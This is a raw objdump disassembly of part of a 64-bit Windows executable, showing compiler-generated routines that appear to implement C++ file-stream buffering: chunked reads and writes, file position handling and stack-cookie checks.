   1400064ec:	45 33 c9             	xor    %r9d,%r9d
   1400064ef:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400064f4:	45 33 c0             	xor    %r8d,%r8d
   1400064f7:	33 d2                	xor    %edx,%edx
   1400064f9:	33 c9                	xor    %ecx,%ecx
   1400064fb:	ff 15 4f 4e 00 00    	call   *0x4e4f(%rip)        # 0x14000b350
   140006501:	cc                   	int3
   140006502:	b9 16 00 00 00       	mov    $0x16,%ecx
   140006507:	48 8b e8             	mov    %rax,%rbp
   14000650a:	48 3b c1             	cmp    %rcx,%rax
   14000650d:	48 0f 42 e9          	cmovb  %rcx,%rbp
   140006511:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   140006515:	48 85 c9             	test   %rcx,%rcx
   140006518:	74 2a                	je     0x140006544
   14000651a:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140006521:	72 19                	jb     0x14000653c
   140006523:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140006527:	48 3b c1             	cmp    %rcx,%rax
   14000652a:	76 4a                	jbe    0x140006576
   14000652c:	eb b1                	jmp    0x1400064df
   14000652e:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140006532:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140006536:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   14000653a:	eb 08                	jmp    0x140006544
   14000653c:	e8 df 22 00 00       	call   0x140008820
   140006541:	48 8b f8             	mov    %rax,%rdi
   140006544:	4c 8b c6             	mov    %rsi,%r8
   140006547:	48 89 3b             	mov    %rdi,(%rbx)
   14000654a:	33 d2                	xor    %edx,%edx
   14000654c:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   140006550:	48 8b cf             	mov    %rdi,%rcx
   140006553:	48 89 6b 18          	mov    %rbp,0x18(%rbx)
   140006557:	e8 29 32 00 00       	call   0x140009785
   14000655c:	48 8b c3             	mov    %rbx,%rax
   14000655f:	c6 04 37 00          	movb   $0x0,(%rdi,%rsi,1)
   140006563:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140006568:	48 83 c4 30          	add    $0x30,%rsp
   14000656c:	5f                   	pop    %rdi
   14000656d:	5e                   	pop    %rsi
   14000656e:	5d                   	pop    %rbp
   14000656f:	c3                   	ret
   140006570:	e8 6b b1 ff ff       	call   0x1400016e0
   140006575:	cc                   	int3
   140006576:	e8 c5 b0 ff ff       	call   0x140001640
   14000657b:	cc                   	int3
   14000657c:	cc                   	int3
   14000657d:	cc                   	int3
   14000657e:	cc                   	int3
   14000657f:	cc                   	int3
   140006580:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006585:	57                   	push   %rdi
   140006586:	48 83 ec 20          	sub    $0x20,%rsp
   14000658a:	48 8b d9             	mov    %rcx,%rbx
   14000658d:	48 8b ca             	mov    %rdx,%rcx
   140006590:	e8 ab 16 00 00       	call   0x140007c40
   140006595:	48 8b c8             	mov    %rax,%rcx
   140006598:	48 8b f8             	mov    %rax,%rdi
   14000659b:	ff 15 07 4c 00 00    	call   *0x4c07(%rip)        # 0x14000b1a8
   1400065a1:	84 c0                	test   %al,%al
   1400065a3:	74 13                	je     0x1400065b8
   1400065a5:	48 c7 43 68 00 00 00 	movq   $0x0,0x68(%rbx)
   1400065ac:	00 
   1400065ad:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400065b2:	48 83 c4 20          	add    $0x20,%rsp
   1400065b6:	5f                   	pop    %rdi
   1400065b7:	c3                   	ret
   1400065b8:	48 8b cb             	mov    %rbx,%rcx
   1400065bb:	48 89 7b 68          	mov    %rdi,0x68(%rbx)
   1400065bf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400065c4:	48 83 c4 20          	add    $0x20,%rsp
   1400065c8:	5f                   	pop    %rdi
   1400065c9:	48 ff 25 50 4b 00 00 	rex.W jmp *0x4b50(%rip)        # 0x14000b120
   1400065d0:	40 53                	rex push %rbx
   1400065d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400065d6:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400065dd:	00 
   1400065de:	48 8b d9             	mov    %rcx,%rbx
   1400065e1:	74 2d                	je     0x140006610
   1400065e3:	48 8b 01             	mov    (%rcx),%rax
   1400065e6:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   1400065eb:	ff 50 18             	call   *0x18(%rax)
   1400065ee:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400065f1:	74 1d                	je     0x140006610
   1400065f3:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   1400065fa:	ff 15 c8 4d 00 00    	call   *0x4dc8(%rip)        # 0x14000b3c8
   140006600:	33 c9                	xor    %ecx,%ecx
   140006602:	85 c0                	test   %eax,%eax
   140006604:	0f 99 c1             	setns  %cl
   140006607:	8d 41 ff             	lea    -0x1(%rcx),%eax
   14000660a:	48 83 c4 20          	add    $0x20,%rsp
   14000660e:	5b                   	pop    %rbx
   14000660f:	c3                   	ret
   140006610:	33 c0                	xor    %eax,%eax
   140006612:	48 83 c4 20          	add    $0x20,%rsp
   140006616:	5b                   	pop    %rbx
   140006617:	c3                   	ret
   140006618:	cc                   	int3
   140006619:	cc                   	int3
   14000661a:	cc                   	int3
   14000661b:	cc                   	int3
   14000661c:	cc                   	int3
   14000661d:	cc                   	int3
   14000661e:	cc                   	int3
   14000661f:	cc                   	int3
   140006620:	40 53                	rex push %rbx
   140006622:	56                   	push   %rsi
   140006623:	48 83 ec 48          	sub    $0x48,%rsp
   140006627:	48 8b 05 12 ba 00 00 	mov    0xba12(%rip),%rax        # 0x140012040
   14000662e:	48 33 c4             	xor    %rsp,%rax
   140006631:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140006636:	33 f6                	xor    %esi,%esi
   140006638:	4d 8b c8             	mov    %r8,%r9
   14000663b:	48 8b d9             	mov    %rcx,%rbx
   14000663e:	48 85 d2             	test   %rdx,%rdx
   140006641:	75 0b                	jne    0x14000664e
   140006643:	4d 85 c0             	test   %r8,%r8
   140006646:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000664c:	74 03                	je     0x140006651
   14000664e:	44 8b c6             	mov    %esi,%r8d
   140006651:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140006658:	48 85 c9             	test   %rcx,%rcx
   14000665b:	0f 84 9e 00 00 00    	je     0x1400066ff
   140006661:	ff 15 29 4d 00 00    	call   *0x4d29(%rip)        # 0x14000b390
   140006667:	85 c0                	test   %eax,%eax
   140006669:	0f 85 90 00 00 00    	jne    0x1400066ff
   14000666f:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140006674:	48 8b cb             	mov    %rbx,%rcx
   140006677:	48 8b bb 80 00 00 00 	mov    0x80(%rbx),%rdi
   14000667e:	c6 43 7c 01          	movb   $0x1,0x7c(%rbx)
   140006682:	40 88 73 71          	mov    %sil,0x71(%rbx)
   140006686:	ff 15 94 4a 00 00    	call   *0x4a94(%rip)        # 0x14000b120
   14000668c:	48 85 ff             	test   %rdi,%rdi
   14000668f:	74 4e                	je     0x1400066df
   140006691:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140006696:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000669b:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   1400066a0:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1400066a5:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400066aa:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1400066af:	48 8b cf             	mov    %rdi,%rcx
   1400066b2:	ff 15 18 4d 00 00    	call   *0x4d18(%rip)        # 0x14000b3d0
   1400066b8:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400066bd:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   1400066c1:	48 89 4b 20          	mov    %rcx,0x20(%rbx)
   1400066c5:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400066ca:	48 89 4b 38          	mov    %rcx,0x38(%rbx)
   1400066ce:	48 89 4b 40          	mov    %rcx,0x40(%rbx)
   1400066d2:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400066d7:	48 89 4b 50          	mov    %rcx,0x50(%rbx)
   1400066db:	48 89 4b 58          	mov    %rcx,0x58(%rbx)
   1400066df:	48 8b 0d 12 9f 01 00 	mov    0x19f12(%rip),%rcx        # 0x1400205f8
   1400066e6:	48 8b c3             	mov    %rbx,%rax
   1400066e9:	48 89 bb 80 00 00 00 	mov    %rdi,0x80(%rbx)
   1400066f0:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1400066f5:	48 89 4b 74          	mov    %rcx,0x74(%rbx)
   1400066f9:	48 89 73 68          	mov    %rsi,0x68(%rbx)
   1400066fd:	eb 02                	jmp    0x140006701
   1400066ff:	33 c0                	xor    %eax,%eax
   140006701:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140006706:	48 33 cc             	xor    %rsp,%rcx
   140006709:	e8 f2 20 00 00       	call   0x140008800
   14000670e:	48 83 c4 48          	add    $0x48,%rsp
   140006712:	5e                   	pop    %rsi
   140006713:	5b                   	pop    %rbx
   140006714:	c3                   	ret
   140006715:	cc                   	int3
   140006716:	cc                   	int3
   140006717:	cc                   	int3
   140006718:	cc                   	int3
   140006719:	cc                   	int3
   14000671a:	cc                   	int3
   14000671b:	cc                   	int3
   14000671c:	cc                   	int3
   14000671d:	cc                   	int3
   14000671e:	cc                   	int3
   14000671f:	cc                   	int3
   140006720:	40 53                	rex push %rbx
   140006722:	56                   	push   %rsi
   140006723:	57                   	push   %rdi
   140006724:	48 83 ec 30          	sub    $0x30,%rsp
   140006728:	48 8b 05 11 b9 00 00 	mov    0xb911(%rip),%rax        # 0x140012040
   14000672f:	48 33 c4             	xor    %rsp,%rax
   140006732:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006737:	49 8b 40 08          	mov    0x8(%r8),%rax
   14000673b:	49 8b f0             	mov    %r8,%rsi
   14000673e:	49 03 00             	add    (%r8),%rax
   140006741:	48 8b da             	mov    %rdx,%rbx
   140006744:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   14000674b:	00 
   14000674c:	48 8b f9             	mov    %rcx,%rdi
   14000674f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006754:	74 70                	je     0x1400067c6
   140006756:	e8 95 18 00 00       	call   0x140007ff0
   14000675b:	84 c0                	test   %al,%al
   14000675d:	74 67                	je     0x1400067c6
   14000675f:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140006766:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000676b:	ff 15 37 4c 00 00    	call   *0x4c37(%rip)        # 0x14000b3a8
   140006771:	85 c0                	test   %eax,%eax
   140006773:	75 51                	jne    0x1400067c6
   140006775:	48 8b 46 10          	mov    0x10(%rsi),%rax
   140006779:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   14000677d:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140006781:	48 8d 47 70          	lea    0x70(%rdi),%rax
   140006785:	48 39 01             	cmp    %rax,(%rcx)
   140006788:	75 22                	jne    0x1400067ac
   14000678a:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   140006791:	4c 8b 87 90 00 00 00 	mov    0x90(%rdi),%r8
   140006798:	48 89 11             	mov    %rdx,(%rcx)
   14000679b:	44 2b c2             	sub    %edx,%r8d
   14000679e:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   1400067a2:	48 89 11             	mov    %rdx,(%rcx)
   1400067a5:	48 8b 4f 50          	mov    0x50(%rdi),%rcx
   1400067a9:	44 89 01             	mov    %r8d,(%rcx)
   1400067ac:	48 8b 57 74          	mov    0x74(%rdi),%rdx
   1400067b0:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400067b5:	48 89 0b             	mov    %rcx,(%rbx)
   1400067b8:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   1400067bc:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   1400067c3:	00 
   1400067c4:	eb 15                	jmp    0x1400067db
   1400067c6:	33 c0                	xor    %eax,%eax
   1400067c8:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   1400067cf:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   1400067d6:	00 
   1400067d7:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400067db:	48 8b c3             	mov    %rbx,%rax
   1400067de:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400067e3:	48 33 cc             	xor    %rsp,%rcx
   1400067e6:	e8 15 20 00 00       	call   0x140008800
   1400067eb:	48 83 c4 30          	add    $0x30,%rsp
   1400067ef:	5f                   	pop    %rdi
   1400067f0:	5e                   	pop    %rsi
   1400067f1:	5b                   	pop    %rbx
   1400067f2:	c3                   	ret
   1400067f3:	cc                   	int3
   1400067f4:	cc                   	int3
   1400067f5:	cc                   	int3
   1400067f6:	cc                   	int3
   1400067f7:	cc                   	int3
   1400067f8:	cc                   	int3
   1400067f9:	cc                   	int3
   1400067fa:	cc                   	int3
   1400067fb:	cc                   	int3
   1400067fc:	cc                   	int3
   1400067fd:	cc                   	int3
   1400067fe:	cc                   	int3
   1400067ff:	cc                   	int3
   140006800:	40 53                	rex push %rbx
   140006802:	55                   	push   %rbp
   140006803:	56                   	push   %rsi
   140006804:	57                   	push   %rdi
   140006805:	41 56                	push   %r14
   140006807:	48 83 ec 30          	sub    $0x30,%rsp
   14000680b:	48 8b 05 2e b8 00 00 	mov    0xb82e(%rip),%rax        # 0x140012040
   140006812:	48 33 c4             	xor    %rsp,%rax
   140006815:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000681a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000681e:	4c 8d 71 70          	lea    0x70(%rcx),%r14
   140006822:	41 8b e9             	mov    %r9d,%ebp
   140006825:	49 8b f0             	mov    %r8,%rsi
   140006828:	48 8b fa             	mov    %rdx,%rdi
   14000682b:	48 8b d9             	mov    %rcx,%rbx
   14000682e:	4c 39 30             	cmp    %r14,(%rax)
   140006831:	75 10                	jne    0x140006843
   140006833:	41 83 f9 01          	cmp    $0x1,%r9d
   140006837:	75 0a                	jne    0x140006843
   140006839:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   14000683e:	75 03                	jne    0x140006843
   140006840:	48 ff ce             	dec    %rsi
   140006843:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   14000684a:	00 
   14000684b:	0f 84 85 00 00 00    	je     0x1400068d6
   140006851:	e8 9a 17 00 00       	call   0x140007ff0
   140006856:	84 c0                	test   %al,%al
   140006858:	74 7c                	je     0x1400068d6
   14000685a:	48 85 f6             	test   %rsi,%rsi
   14000685d:	75 05                	jne    0x140006864
   14000685f:	83 fd 01             	cmp    $0x1,%ebp
   140006862:	74 17                	je     0x14000687b
   140006864:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   14000686b:	44 8b c5             	mov    %ebp,%r8d
   14000686e:	48 8b d6             	mov    %rsi,%rdx
   140006871:	ff 15 79 4b 00 00    	call   *0x4b79(%rip)        # 0x14000b3f0
   140006877:	85 c0                	test   %eax,%eax
   140006879:	75 5b                	jne    0x1400068d6
   14000687b:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140006882:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140006887:	ff 15 0b 4b 00 00    	call   *0x4b0b(%rip)        # 0x14000b398
   14000688d:	85 c0                	test   %eax,%eax
   14000688f:	75 45                	jne    0x1400068d6
   140006891:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140006895:	4c 39 30             	cmp    %r14,(%rax)
   140006898:	75 22                	jne    0x1400068bc
   14000689a:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   1400068a1:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   1400068a8:	48 89 10             	mov    %rdx,(%rax)
   1400068ab:	44 2b c2             	sub    %edx,%r8d
   1400068ae:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   1400068b2:	48 89 11             	mov    %rdx,(%rcx)
   1400068b5:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   1400068b9:	44 89 01             	mov    %r8d,(%rcx)
   1400068bc:	48 8b 53 74          	mov    0x74(%rbx),%rdx
   1400068c0:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400068c5:	48 89 0f             	mov    %rcx,(%rdi)
   1400068c8:	48 89 57 10          	mov    %rdx,0x10(%rdi)
   1400068cc:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   1400068d3:	00 
   1400068d4:	eb 15                	jmp    0x1400068eb
   1400068d6:	33 c0                	xor    %eax,%eax
   1400068d8:	48 c7 07 ff ff ff ff 	movq   $0xffffffffffffffff,(%rdi)
   1400068df:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   1400068e6:	00 
   1400068e7:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1400068eb:	48 8b c7             	mov    %rdi,%rax
   1400068ee:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400068f3:	48 33 cc             	xor    %rsp,%rcx
   1400068f6:	e8 05 1f 00 00       	call   0x140008800
   1400068fb:	48 83 c4 30          	add    $0x30,%rsp
   1400068ff:	41 5e                	pop    %r14
   140006901:	5f                   	pop    %rdi
   140006902:	5e                   	pop    %rsi
   140006903:	5d                   	pop    %rbp
   140006904:	5b                   	pop    %rbx
   140006905:	c3                   	ret
   140006906:	cc                   	int3
   140006907:	cc                   	int3
   140006908:	cc                   	int3
   140006909:	cc                   	int3
   14000690a:	cc                   	int3
   14000690b:	cc                   	int3
   14000690c:	cc                   	int3
   14000690d:	cc                   	int3
   14000690e:	cc                   	int3
   14000690f:	cc                   	int3
   140006910:	40 53                	rex push %rbx
   140006912:	55                   	push   %rbp
   140006913:	57                   	push   %rdi
   140006914:	48 83 ec 20          	sub    $0x20,%rsp
   140006918:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   14000691d:	49 8b d8             	mov    %r8,%rbx
   140006920:	48 8b ea             	mov    %rdx,%rbp
   140006923:	48 8b f9             	mov    %rcx,%rdi
   140006926:	74 0e                	je     0x140006936
   140006928:	48 83 c4 20          	add    $0x20,%rsp
   14000692c:	5f                   	pop    %rdi
   14000692d:	5d                   	pop    %rbp
   14000692e:	5b                   	pop    %rbx
   14000692f:	48 ff 25 22 48 00 00 	rex.W jmp *0x4822(%rip)        # 0x14000b158
   140006936:	48 8b 41 40          	mov    0x40(%rcx),%rax
   14000693a:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   14000693f:	48 8b f3             	mov    %rbx,%rsi
   140006942:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140006947:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   14000694c:	4c 8b 08             	mov    (%rax),%r9
   14000694f:	4d 85 c9             	test   %r9,%r9
   140006952:	74 08                	je     0x14000695c
   140006954:	48 8b 41 58          	mov    0x58(%rcx),%rax
   140006958:	8b 08                	mov    (%rax),%ecx
   14000695a:	eb 02                	jmp    0x14000695e
   14000695c:	33 c9                	xor    %ecx,%ecx
   14000695e:	4c 63 f9             	movslq %ecx,%r15
   140006961:	48 85 db             	test   %rbx,%rbx
   140006964:	7e 52                	jle    0x1400069b8
   140006966:	85 c9                	test   %ecx,%ecx
   140006968:	7e 2e                	jle    0x140006998
   14000696a:	49 3b df             	cmp    %r15,%rbx
   14000696d:	49 8b c9             	mov    %r9,%rcx
   140006970:	4c 0f 4c fb          	cmovl  %rbx,%r15
   140006974:	4d 8b c7             	mov    %r15,%r8
   140006977:	e8 0f 2e 00 00       	call   0x14000978b
   14000697c:	48 8b 47 58          	mov    0x58(%rdi),%rax
   140006980:	49 2b df             	sub    %r15,%rbx
   140006983:	49 03 ef             	add    %r15,%rbp
   140006986:	44 29 38             	sub    %r15d,(%rax)
   140006989:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   14000698d:	49 63 c7             	movslq %r15d,%rax
   140006990:	48 01 01             	add    %rax,(%rcx)
   140006993:	48 85 db             	test   %rbx,%rbx
   140006996:	7e 20                	jle    0x1400069b8
   140006998:	4c 8b 8f 80 00 00 00 	mov    0x80(%rdi),%r9
   14000699f:	4d 85 c9             	test   %r9,%r9
   1400069a2:	74 14                	je     0x1400069b8
   1400069a4:	4c 8b c3             	mov    %rbx,%r8
   1400069a7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400069ac:	48 8b cd             	mov    %rbp,%rcx
   1400069af:	ff 15 eb 49 00 00    	call   *0x49eb(%rip)        # 0x14000b3a0
   1400069b5:	48 2b d8             	sub    %rax,%rbx
   1400069b8:	4c 8b 7c 24 58       	mov    0x58(%rsp),%r15
   1400069bd:	48 2b f3             	sub    %rbx,%rsi
   1400069c0:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   1400069c5:	48 8b c6             	mov    %rsi,%rax
   1400069c8:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400069cd:	48 83 c4 20          	add    $0x20,%rsp
   1400069d1:	5f                   	pop    %rdi
   1400069d2:	5d                   	pop    %rbp
   1400069d3:	5b                   	pop    %rbx
   1400069d4:	c3                   	ret
   1400069d5:	cc                   	int3
   1400069d6:	cc                   	int3
   1400069d7:	cc                   	int3
   1400069d8:	cc                   	int3
   1400069d9:	cc                   	int3
   1400069da:	cc                   	int3
   1400069db:	cc                   	int3
   1400069dc:	cc                   	int3
   1400069dd:	cc                   	int3
   1400069de:	cc                   	int3
   1400069df:	cc                   	int3
   1400069e0:	40 55                	rex push %rbp
   1400069e2:	56                   	push   %rsi
   1400069e3:	41 56                	push   %r14
   1400069e5:	48 83 ec 30          	sub    $0x30,%rsp
   1400069e9:	4d 8b f0             	mov    %r8,%r14
   1400069ec:	48 8b ea             	mov    %rdx,%rbp
   1400069ef:	48 8b f1             	mov    %rcx,%rsi
   1400069f2:	4d 85 c0             	test   %r8,%r8
   1400069f5:	7f 0b                	jg     0x140006a02
   1400069f7:	33 c0                	xor    %eax,%eax
   1400069f9:	48 83 c4 30          	add    $0x30,%rsp
   1400069fd:	41 5e                	pop    %r14
   1400069ff:	5e                   	pop    %rsi
   140006a00:	5d                   	pop    %rbp
   140006a01:	c3                   	ret
   140006a02:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140006a07:	74 0f                	je     0x140006a18
   140006a09:	48 83 c4 30          	add    $0x30,%rsp
   140006a0d:	41 5e                	pop    %r14
   140006a0f:	5e                   	pop    %rsi
   140006a10:	5d                   	pop    %rbp
   140006a11:	48 ff 25 38 47 00 00 	rex.W jmp *0x4738(%rip)        # 0x14000b150
   140006a18:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140006a1c:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140006a21:	49 8b de             	mov    %r14,%rbx
   140006a24:	48 8b 10             	mov    (%rax),%rdx
   140006a27:	48 85 d2             	test   %rdx,%rdx
   140006a2a:	74 08                	je     0x140006a34
   140006a2c:	48 8b 41 50          	mov    0x50(%rcx),%rax
   140006a30:	8b 08                	mov    (%rax),%ecx
   140006a32:	eb 02                	jmp    0x140006a36
   140006a34:	33 c9                	xor    %ecx,%ecx
   140006a36:	48 63 c1             	movslq %ecx,%rax
   140006a39:	85 c9                	test   %ecx,%ecx
   140006a3b:	74 35                	je     0x140006a72
   140006a3d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140006a42:	49 3b c6             	cmp    %r14,%rax
   140006a45:	49 8b fe             	mov    %r14,%rdi
   140006a48:	48 8b cd             	mov    %rbp,%rcx
   140006a4b:	48 0f 42 f8          	cmovb  %rax,%rdi
   140006a4f:	4c 8b c7             	mov    %rdi,%r8
   140006a52:	e8 34 2d 00 00       	call   0x14000978b
   140006a57:	48 8b 46 50          	mov    0x50(%rsi),%rax
   140006a5b:	48 03 ef             	add    %rdi,%rbp
   140006a5e:	48 2b df             	sub    %rdi,%rbx
   140006a61:	29 38                	sub    %edi,(%rax)
   140006a63:	48 8b 4e 38          	mov    0x38(%rsi),%rcx
   140006a67:	48 63 c7             	movslq %edi,%rax
   140006a6a:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140006a6f:	48 01 01             	add    %rax,(%rcx)
   140006a72:	48 83 be 80 00 00 00 	cmpq   $0x0,0x80(%rsi)
   140006a79:	00 
   140006a7a:	0f 84 8e 00 00 00    	je     0x140006b0e
   140006a80:	4c 8b 46 18          	mov    0x18(%rsi),%r8
   140006a84:	48 8d 46 70          	lea    0x70(%rsi),%rax
   140006a88:	49 39 00             	cmp    %rax,(%r8)
   140006a8b:	75 20                	jne    0x140006aad
   140006a8d:	48 8b 8e 88 00 00 00 	mov    0x88(%rsi),%rcx
   140006a94:	48 8b 96 90 00 00 00 	mov    0x90(%rsi),%rdx
   140006a9b:	49 89 08             	mov    %rcx,(%r8)
   140006a9e:	2b d1                	sub    %ecx,%edx
   140006aa0:	48 8b 46 38          	mov    0x38(%rsi),%rax
   140006aa4:	48 89 08             	mov    %rcx,(%rax)
   140006aa7:	48 8b 46 50          	mov    0x50(%rsi),%rax
   140006aab:	89 10                	mov    %edx,(%rax)
   140006aad:	48 81 fb ff 0f 00 00 	cmp    $0xfff,%rbx
   140006ab4:	76 38                	jbe    0x140006aee
   140006ab6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140006abd:	00 00 00 
   140006ac0:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   140006ac7:	ba 01 00 00 00       	mov    $0x1,%edx
   140006acc:	41 b8 ff 0f 00 00    	mov    $0xfff,%r8d
   140006ad2:	48 8b cd             	mov    %rbp,%rcx
   140006ad5:	ff 15 d5 48 00 00    	call   *0x48d5(%rip)        # 0x14000b3b0
   140006adb:	48 03 e8             	add    %rax,%rbp
   140006ade:	48 2b d8             	sub    %rax,%rbx
   140006ae1:	48 3d ff 0f 00 00    	cmp    $0xfff,%rax
   140006ae7:	75 25                	jne    0x140006b0e
   140006ae9:	48 3b d8             	cmp    %rax,%rbx
   140006aec:	77 d2                	ja     0x140006ac0
   140006aee:	48 85 db             	test   %rbx,%rbx
   140006af1:	74 1b                	je     0x140006b0e
   140006af3:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   140006afa:	4c 8b c3             	mov    %rbx,%r8
   140006afd:	ba 01 00 00 00       	mov    $0x1,%edx
   140006b02:	48 8b cd             	mov    %rbp,%rcx
   140006b05:	ff 15 a5 48 00 00    	call   *0x48a5(%rip)        # 0x14000b3b0
   140006b0b:	48 2b d8             	sub    %rax,%rbx
   140006b0e:	4c 2b f3             	sub    %rbx,%r14
   140006b11:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140006b16:	49 8b c6             	mov    %r14,%rax
   140006b19:	48 83 c4 30          	add    $0x30,%rsp
   140006b1d:	41 5e                	pop    %r14
   140006b1f:	5e                   	pop    %rsi
   140006b20:	5d                   	pop    %rbp
   140006b21:	c3                   	ret
   140006b22:	cc                   	int3
   140006b23:	cc                   	int3
   140006b24:	cc                   	int3
   140006b25:	cc                   	int3
   140006b26:	cc                   	int3
   140006b27:	cc                   	int3
   140006b28:	cc                   	int3
   140006b29:	cc                   	int3
   140006b2a:	cc                   	int3
   140006b2b:	cc                   	int3
   140006b2c:	cc                   	int3
   140006b2d:	cc                   	int3
   140006b2e:	cc                   	int3
   140006b2f:	cc                   	int3
   140006b30:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006b35:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006b3a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140006b3f:	55                   	push   %rbp
   140006b40:	48 8b ec             	mov    %rsp,%rbp
   140006b43:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140006b4a:	48 8b 05 ef b4 00 00 	mov    0xb4ef(%rip),%rax        # 0x140012040
   140006b51:	48 33 c4             	xor    %rsp,%rax
   140006b54:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140006b58:	48 8b f9             	mov    %rcx,%rdi
   140006b5b:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140006b5f:	48 8b 08             	mov    (%rax),%rcx
   140006b62:	48 85 c9             	test   %rcx,%rcx
   140006b65:	74 2c                	je     0x140006b93
   140006b67:	48 8b 57 50          	mov    0x50(%rdi),%rdx
   140006b6b:	4c 63 0a             	movslq (%rdx),%r9
   140006b6e:	4a 8d 04 09          	lea    (%rcx,%r9,1),%rax
   140006b72:	48 3b c8             	cmp    %rax,%rcx
   140006b75:	73 1c                	jae    0x140006b93
   140006b77:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   140006b7b:	89 02                	mov    %eax,(%rdx)
   140006b7d:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140006b81:	48 8b 11             	mov    (%rcx),%rdx
   140006b84:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140006b88:	48 89 01             	mov    %rax,(%rcx)
   140006b8b:	0f b6 02             	movzbl (%rdx),%eax
   140006b8e:	e9 5c 02 00 00       	jmp    0x140006def
   140006b93:	48 83 bf 80 00 00 00 	cmpq   $0x0,0x80(%rdi)
   140006b9a:	00 
   140006b9b:	75 0a                	jne    0x140006ba7
   140006b9d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140006ba2:	e9 48 02 00 00       	jmp    0x140006def
